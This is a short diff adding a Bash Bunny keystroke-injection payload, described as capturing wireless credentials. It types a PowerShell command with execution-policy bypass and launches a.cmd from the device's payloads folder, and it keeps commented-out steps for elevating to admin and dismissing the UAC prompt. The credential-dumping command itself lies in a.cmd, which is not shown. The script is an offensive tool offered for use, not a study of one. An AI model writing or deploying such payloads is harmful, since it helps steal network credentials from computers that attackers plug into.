@@ -1,0 +1,36 @@
+
+
+###### Now using this Bashbunny script to capture the wireless credentials  #######
+
+# Set language accordingly
+Q SET_LANGUAGE US
+ATTACKMODE HID STORAGE
+
+LED B 200
+
+#Launch Powershell As Admin
+#Q GUI r
+#Q DELAY 100
+#Q STRING powershell Start-Process powershell -Verb runAs 
+#Q ENTER
+
+# Bypass UAC
+#Q DELAY 3000
+#Q ALT y
+#Q ENTER
+#Q DELAY 500
+
+
+Q DELAY 1000
+Q STRING powershell -exec bypass
+Q ENTER
+Q DELAY 3000
+
+
+# 	Start a.cmd
+Q STRING '.((gwmi win32_volume -f '"''"'label='"''"'BashBunny'"''"').Name+'"''"'payloads/'
+Q STRING $SWITCH_POSITION
+Q STRING 'a.cmd'"''"')'
+Q ENTER
+
+# Wait for the a.cmd to finish and exit
